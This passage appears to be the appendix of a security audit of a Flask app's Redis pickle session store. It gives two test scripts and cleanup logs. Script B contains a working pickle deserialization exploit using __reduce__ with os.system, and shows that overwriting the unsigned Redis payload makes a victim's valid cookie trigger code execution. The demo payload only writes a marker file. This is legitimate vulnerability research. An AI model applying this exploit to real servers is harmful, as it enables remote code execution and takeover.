            print("session:* keys AFTER logout =", session_keys())
            new_cookie = getcookie(client, "slapp")
            print("slapp cookie in jar AFTER logout =", repr(new_cookie),
                  "(LAST Set-Cookie wins)")
            new_sid = signer.unsign(new_cookie).decode()
            new_key = sess._get_key(new_sid)
            new_raw = r_read.get(new_key)
            print("NEW (post-logout) Redis key =", new_key)
            print("NEW payload raw bytes (VERBATIM repr) =", repr(new_raw))
            print("NEW payload pickle.loads =",
                  _orig_loads(new_raw) if new_raw is not None else None)
            print("NEW payload keys (sorted) =",
                  sorted(_orig_loads(new_raw).keys())
                  if new_raw is not None else None)
            print("NEW payload TTL (setex)  =", r_read.ttl(new_key),
                  "s  (anonymous: '_user_id' absent -> 300 branch)")

        # ===== 4.3  corrupted payload -> silent reset =====================
        print("\n===== 4.3 CORRUPTED PAYLOAD -> SILENT RESET =====")
        with app.test_client() as client:
            client.environ_base[constants.HEADER_ALLOW_API_COOKIES] = "allow"
            u = create_new_user()
            login(client, u.email)
            sid_before = signer.unsign(getcookie(client, "slapp")).decode()
            key = sess._get_key(sid_before)
            pre = client.get("/dashboard/")
            print("BEFORE corruption: authenticated sid =", sid_before,
                  "; GET /dashboard/ ->", pre.status_code,
                  "(200=authenticated)")
            malformed = b"\x00this is definitely not a valid pickle stream\xff\xfe"
            try:
                _orig_loads(malformed)
            except Exception as e:
                print("DURING: direct pickle.loads(malformed) RAISES: "
                      + type(e).__name__ + ": " + str(e))
            r_write.set(key, malformed)
            reset_counter()
            after = client.get("/dashboard/")
            sid_after = signer.unsign(getcookie(client, "slapp")).decode()
            print("AFTER (next real GET /dashboard/): status =",
                  after.status_code, "; Location =",
                  after.headers.get("Location"))
            print("  pickle.loads invoked =", _calls["n"],
                  "x ; swallowed exception =", _calls["last_exc"])
            print("  sid", "CHANGED" if sid_before != sid_after else "SAME",
                  sid_before, "->", sid_after,
                  "==", "SILENT RESET" if sid_before != sid_after else "NO RESET")
            print("  malformed bytes written (VERBATIM repr) =", repr(malformed))

        # ===== 4.4  edge / error paths ====================================
        print("\n===== 4.4 EDGE / ERROR PATHS =====")

        # (3a) deleted / missing key -> pickle.loads never reached
        print("\nCONDITION 3a - DELETED / MISSING REDIS VALUE "
              "(pickle.loads never reached)")
        with app.test_client() as client:
            client.environ_base[constants.HEADER_ALLOW_API_COOKIES] = "allow"
            u = create_new_user()
            login(client, u.email)
            sid = signer.unsign(getcookie(client, "slapp")).decode()
            key = sess._get_key(sid)
            r_write.delete(key)
            print("redis.get(key) after delete =", r_read.get(key))
            reset_counter()
            r = client.get("/dashboard/")
            sid2 = signer.unsign(getcookie(client, "slapp")).decode()
            print("GET /dashboard/ -> status", r.status_code,
                  "; pickle.loads invoked =", _calls["n"],
                  "x  (guard 'if val is not None' short-circuits on None)")
            print("sid reset:", sid, "->", sid2)

        # (3b) BadSignature cookie -> rejected before Redis/pickle
        print("\nCONDITION 3b - BAD SIGNATURE COOKIE "
              "(rejected before Redis/pickle)")
        with app.test_client() as client:
            client.environ_base[constants.HEADER_ALLOW_API_COOKIES] = "allow"
            u = create_new_user()
            login(client, u.email)
            good = getcookie(client, "slapp")
            tampered = good[:-1] + ("A" if good[-1] != "A" else "B")
            print("good cookie     =", good)
            print("tampered cookie =", tampered)
            with app.test_request_context(headers={"Cookie": "slapp=" + good}):
                print("extract_and_validate_session_id(good)     =",
                      sess.extract_and_validate_session_id(app, request))
            with app.test_request_context(headers={"Cookie": "slapp=" + tampered}):
                print("extract_and_validate_session_id(tampered) =",
                      sess.extract_and_validate_session_id(app, request))
            try:
                signer.unsign(tampered)
            except itsdangerous.BadSignature as e:
                print("signer.unsign(tampered) RAISES: BadSignature:", e)
        # real path with a fresh client carrying only the tampered cookie
        with app.test_client() as c2:
            c2.environ_base[constants.HEADER_ALLOW_API_COOKIES] = "allow"
            reset_counter()
            r = c2.get("/dashboard/", headers={"Cookie": "slapp=" + tampered})
            print("request w/ tampered cookie -> status", r.status_code,
                  "; pickle.loads invoked =", _calls["n"],
                  "x (sid None -> Redis never read)")

        # (3c) truncated pickle -> UnpicklingError -> caught
        print("\nCONDITION 3c - TRUNCATED PICKLE (UnpicklingError -> caught)")
        with app.test_client() as client:
            client.environ_base[constants.HEADER_ALLOW_API_COOKIES] = "allow"
            u = create_new_user()
            login(client, u.email)
            sid = signer.unsign(getcookie(client, "slapp")).decode()
            key = sess._get_key(sid)
            valid = r_read.get(key)
            truncated = valid[:15]
            print("valid payload len =", len(valid),
                  "-> truncated to 15 bytes:", repr(truncated))
            try:
                _orig_loads(truncated)
            except Exception as e:
                print("direct pickle.loads(truncated) RAISES: "
                      + type(e).__name__ + ": " + str(e))
            r_write.set(key, truncated)
            reset_counter()
            r = client.get("/dashboard/")
            sid2 = signer.unsign(getcookie(client, "slapp")).decode()
            print("through real path GET /dashboard/: status", r.status_code,
                  "; loads invoked", _calls["n"],
                  "x ; swallowed =", _calls["last_exc"])
            print("sid reset:", sid, "->", sid2)

        # (3d) stored-empty b'' value -> reaches pickle.loads -> EOFError
        print("\nCONDITION 3d - STORED EMPTY b'' VALUE "
              "(NOT None: reaches pickle.loads -> EOFError)")
        with app.test_client() as client:
            client.environ_base[constants.HEADER_ALLOW_API_COOKIES] = "allow"
            u = create_new_user()
            login(client, u.email)
            sid = signer.unsign(getcookie(client, "slapp")).decode()
            key = sess._get_key(sid)
            r_write.set(key, b"")
            got = r_read.get(key)
            print("redis.get(key) after set(key, b'') =", repr(got),
                  "; (got is None) =", got is None,
                  "; (got is not None) =", got is not None)
            try:
                _orig_loads(got)
            except Exception as e:
                print("direct pickle.loads(b'') RAISES: "
                      + type(e).__name__ + ": " + str(e))
            reset_counter()
            r = client.get("/dashboard/")
            sid2 = signer.unsign(getcookie(client, "slapp")).decode()
            print("through real path GET /dashboard/: status", r.status_code,
                  "; loads invoked", _calls["n"],
                  "x ; swallowed =", _calls["last_exc"])
            print("sid reset:", sid, "->", sid2)
finally:
    transaction.rollback()
    Session.rollback()
    Session.close()
    print("\n[teardown] transaction rolled back; DB state restored.")
```

### A.2 Script B — observability + CWE-502 boundary + threat model (`/tmp/sl_obs/obs_b.py`)

This is **Script B** (`obs_b.py`). It produces evidence blocks **4.5–4.7**: observability (§4), the CWE-502 boundary demonstration (§6), and the signed-pointer-vs-unsigned-payload threat model (§7). Its `capture_fd` helper (lines 92–105) redirects **fd 1 (stdout) only** — the descriptor the `SL` logger writes to — around a single request, then restores it. Its captured stdout was saved as `obs_b.out`.

```python
"""
Observation Script B -- observability + CWE-502 boundary + threat model.

  4.5 OBSERVABILITY: grep proof that app/session.py imports no logger, plus
      OS file-descriptor-level capture of the log output of ONE normal (200)
      request vs ONE corrupted->reset (302) request. The SL logger writes to
      the process's ORIGINAL stdout file descriptor (fd 1), so os.dup2()
      redirection of fd 1 to a temp file is required; Python-level sys.stdout
      reassignment does not intercept it. capture_fd redirects fd 1 ONLY.
  4.6 BOUNDARY: a well-formed *malicious* pickle whose ONLY effect is to write
      the benign marker file /tmp/pickle_rce_marker, exercised on the identical
      code path in three conditions (isolation / real open_session / benign).
  4.7 THREAT MODEL: the HMAC signature covers the session-id pointer only, so
      overwriting the unsigned Redis payload leaves the victim's cookie valid;
      the victim's own unforged cookie then drives pickle.loads -> RCE.
Harness mirrors tests/conftest.py exactly (see Script A docstring).
"""
import os

os.environ["CONFIG"] = os.environ.get("CONFIG") or "tests/test.env"
os.environ.setdefault("GITHUB_ACTIONS_TEST", "true")

import sys
import pickle
import pickletools
import subprocess

import sqlalchemy
from flask import testing, url_for
import itsdangerous
from psycopg2 import errors
from psycopg2.errorcodes import DEPENDENT_OBJECTS_STILL_EXIST

from app.db import Session, connection, engine
from app import config, constants
import app.session as sessmod
from server import create_app
from init_app import add_sl_domains, add_proton_partner
from tests.utils import create_new_user

MARKER = "/tmp/pickle_rce_marker"

# ---- app bootstrap, identical to tests/conftest.py ------------------------
app = create_app()
app.config["TESTING"] = True
app.config["WTF_CSRF_ENABLED"] = False
app.config["SERVER_NAME"] = "sl.test"

with engine.connect() as conn:
    try:
        conn.execute("DROP EXTENSION if exists pg_trgm")
        conn.execute("CREATE EXTENSION pg_trgm")
    except sqlalchemy.exc.InternalError as e:
        if isinstance(e.orig, errors.lookup(DEPENDENT_OBJECTS_STILL_EXIST)):
            print(">>> pg_trgm can't be dropped, ignore")
        conn.execute("Rollback")

add_sl_domains()
add_proton_partner()

sess = app.session_interface
r_read, r_write = sess._redis_r, sess._redis_w


def getcookie(client, name):
    for c in client.cookie_jar:
        if c.name == name:
            return c.value
    return None


def login(client, email):
    return client.post(
        url_for("auth.login"),
        data={"email": email, "password": "password"},
        follow_redirects=True,
    )


def rm_marker():
    if os.path.exists(MARKER):
        os.remove(MARKER)


def marker_state():
    if not os.path.exists(MARKER):
        return False, None
    with open(MARKER) as f:
        return True, f.read().strip()


# OS fd-level capture: redirect fd 1 ONLY to a temp file around fn(), restore.
def capture_fd(fn, path="/tmp/sl_obs/_cap.txt"):
    saved = os.dup(1)
    f = open(path, "w")
    os.dup2(f.fileno(), 1)
    try:
        fn()
    finally:
        sys.stdout.flush()
        os.dup2(saved, 1)
        os.close(saved)
        f.close()
    with open(path) as fh:
        return fh.read()


transaction = connection.begin()
try:
    with app.app_context():
        config.DISABLE_RATE_LIMIT = True
        signer = sess._get_signer(app)

        # ===== 4.5  observability =========================================
        print("===== 4.5 OBSERVABILITY =====")
        repo = os.environ.get("PYTHONPATH", ".").split(os.pathsep)[0]
        grep = subprocess.run(
            ["grep", "-nE",
             r"import logging|from .*log|LOG|logger|logging\.",
             os.path.join(repo, "app", "session.py")],
            capture_output=True, text=True,
        )
        print("$ grep -nE 'import logging|from .*log|LOG|logger|logging\\.' "
              "app/session.py")
        print(grep.stdout.rstrip() or "(no matches)")

        with app.test_client() as client:
            client.environ_base[constants.HEADER_ALLOW_API_COOKIES] = "allow"
            u = create_new_user()
            login(client, u.email)
            sid = signer.unsign(getcookie(client, "slapp")).decode()
            key = sess._get_key(sid)

            # (A) one NORMAL authenticated request (200)
            capA = capture_fd(lambda: client.get("/dashboard/"))
            # corrupt, then (B) one CORRUPTED -> RESET request (302)
            r_write.set(key, b"\x00not a valid pickle\xff\xfe")
            capB = capture_fd(lambda: client.get("/dashboard/"))

            print("(A) NORMAL authenticated GET /dashboard/ (200) log lines:")
            for ln in capA.strip().splitlines():
                print("   ", ln)
            print("(B) CORRUPTED->RESET GET /dashboard/ (302) log lines:")
            for ln in capB.strip().splitlines():
                print("   ", ln)
            joined = (capA + capB).lower()
            print("reset-log mentions pickle/unpickl/reset/corrupt/badsignature =",
                  any(t in joined for t in
                      ["pickle", "unpickl", "reset", "corrupt", "badsignature"]))
            print("session.py emitted anything =",
                  ("session.py" in (capA + capB)))

        # ===== 4.6  boundary ==============================================
        print("\n===== 4.6 BOUNDARY: harmless reset vs weaponized pickle =====")

        class Exploit:
            def __reduce__(self):
                return (os.system,
                        ("echo 'ARBITRARY-CODE-EXECUTED-INSIDE-pickle.loads' > "
                         + MARKER,))

        MAL = pickle.dumps(Exploit(), protocol=4)
        print("malicious pickle bytes (VERBATIM repr) =", repr(MAL))
        print("pickletools.dis(malicious):")
        pickletools.dis(MAL)

        print("\n(1) ISOLATION - direct pickle.loads(payload):")
        rm_marker()
        print("  marker BEFORE =", marker_state()[0])
        ret = pickle.loads(MAL)
        st, content = marker_state()
        print("  pickle.loads returned =", ret, "(os.system exit code)")
        print("  marker AFTER =", st, "; content =", content)

        print("\n(2) THROUGH REAL open_session PATH (attacker with Redis write):")
        with app.test_client() as client:
            client.environ_base[constants.HEADER_ALLOW_API_COOKIES] = "allow"
            u = create_new_user()
            login(client, u.email)
            sid = signer.unsign(getcookie(client, "slapp")).decode()
            key = sess._get_key(sid)
            rm_marker()
            print("  login sid =", sid, "; marker BEFORE =", marker_state()[0])
            r_write.set(key, MAL)
            r = client.get("/dashboard/")
            print("  GET /dashboard/ -> status", r.status_code)
            print("  marker AFTER =", marker_state()[0],
                  "=> RCE inside pickle.loads at app/session.py:76 BEFORE "
                  "except at :78")

        print("\n(3) CONTRAST benign malformed bytes (identical path, NOT weaponized):")
        with app.test_client() as client:
            client.environ_base[constants.HEADER_ALLOW_API_COOKIES] = "allow"
            u = create_new_user()
            login(client, u.email)
            sid = signer.unsign(getcookie(client, "slapp")).decode()
            key = sess._get_key(sid)
            rm_marker()
            r_write.set(key, b"\x00not a pickle\xff\xfe")
            r = client.get("/dashboard/")
            print("  GET /dashboard/ -> status", r.status_code,
                  "; marker AFTER =", marker_state()[0],
                  "=> NO callable invoked (harmless reset)")

        # ===== 4.7  threat model ==========================================
        print("\n===== 4.7 THREAT MODEL: signed pointer vs unsigned payload =====")
        with app.test_client() as client:
            client.environ_base[constants.HEADER_ALLOW_API_COOKIES] = "allow"
            u = create_new_user()
            login(client, u.email)
            cookie = getcookie(client, "slapp")
            sid = signer.unsign(cookie).decode()
            key = sess._get_key(sid)
            print("victim cookie =", cookie)
            reconstruct = signer.sign(itsdangerous.want_bytes(sid)).decode()
            print("signer.sign(want_bytes(sid)) == emitted cookie ? ",
                  reconstruct == cookie,
                  "(signs ONLY the sid string, salt='session')")
            print("signer.validate(cookie) BEFORE payload tamper =",
                  signer.validate(cookie))
            r_write.set(key, MAL)                 # overwrite payload ONLY
            print("signer.validate(cookie) AFTER payload tamper  =",
                  signer.validate(cookie),
                  "(UNCHANGED => signature independent of payload)")
            rm_marker()
            print("marker BEFORE victim's next request =", marker_state()[0])
            r = client.get("/dashboard/")        # victim's OWN unforged cookie
            print("victim's next request (OWN valid unforged cookie) -> status",
                  r.status_code, "; marker AFTER =", marker_state()[0],
                  "=> legit signed sid POINTED open_session at attacker's "
                  "unsigned payload -> pickle.loads -> RCE")
finally:
    rm_marker()
    if os.path.exists("/tmp/sl_obs/_cap.txt"):
        os.remove("/tmp/sl_obs/_cap.txt")
    transaction.rollback()
    Session.rollback()
    Session.close()
    print("\n[teardown] marker removed; transaction rolled back; DB restored.")
```

> **Safety note.** In Script B the malicious pickle's *only* side effect is writing the benign marker file `/tmp/pickle_rce_marker`; no destructive command is executed. The script removes the marker in its `finally:` block (and again in Appendix B), and the demonstrated RCE is contingent on Redis **write** access — it is not reachable by a normal web client.

---

## Appendix B — Cleanup and read-only-scope confirmation

Per the read-only scope, all temporary artifacts were removed and the repository was left unchanged except for this one document. The two observation scripts and their captured output lived **outside** the repository, under `/tmp/sl_obs`:

```bash
# the observation artifacts lived OUTSIDE the repo tree, under /tmp/sl_obs.
# The two canonical scripts whose verbatim output is transcribed in this document
# (and reproduced in full in Appendix A) are obs_c.py (Script A) and obs_b.py (Script B):
#   obs_c.py       - Script A: baseline + corrupted + edge/error paths (evidence 4.0-4.4 -> sections 2-5)
#   obs_c.out      - Script A captured stdout
#   obs_b.py       - Script B: observability + boundary + threat model (evidence 4.5-4.7 -> sections 4, 6, 7)
#   obs_b.out      - Script B captured stdout
#   provenance.out - captured version/git provenance (section 1.2)
# The directory also held superseded earlier-iteration drafts and scratch files
# (obs_a.py, obs_a.out, obs_a_run2.out, edge_block.txt, and per-run *.err logs);
# all of these were removed by the rm -rf below, leaving the repository unchanged.

# remove all temporary scripts, their output, and the benign marker (OUTSIDE the repo)
$ rm -rf /tmp/sl_obs
$ rm -f  /tmp/pickle_rce_marker
```

The repository working tree was then confirmed to differ **only** in this one document. The following is the **actual, unedited** `git` output (not an "expected" comment):

```text
$ git status --porcelain
 M blitzy/documentation/app_2cd6ee777f8c.md

$ git diff --name-status 2cd6ee777f8c2d3531559588bcfb18627ffb5d2c HEAD
A	blitzy/documentation/app_2cd6ee777f8c.md
```

Read these two commands with their different reference points in mind: `git status --porcelain` compares the working tree to the **destination-branch HEAD** (`13310d18…`, which already carries a prior copy of this document), so it reports this document as modified (` M`) while this remediation is uncommitted, and reports a clean tree once committed. `git diff --name-status` against the **source-branch commit under investigation** (`2cd6ee77…`) shows the sole change is the **addition** (`A`) of this document. No source, test, configuration, manifest, CI, Docker, or dependency file appears in either output.

**Read-only discipline confirmed:** no existing source file was modified, created, or deleted; no dependency was added, updated, or removed; the only artifact added to the repository is `blitzy/documentation/app_2cd6ee777f8c.md`. The source-branch commit under investigation (`2cd6ee777f8c2d3531559588bcfb18627ffb5d2c`) is unchanged by this work.
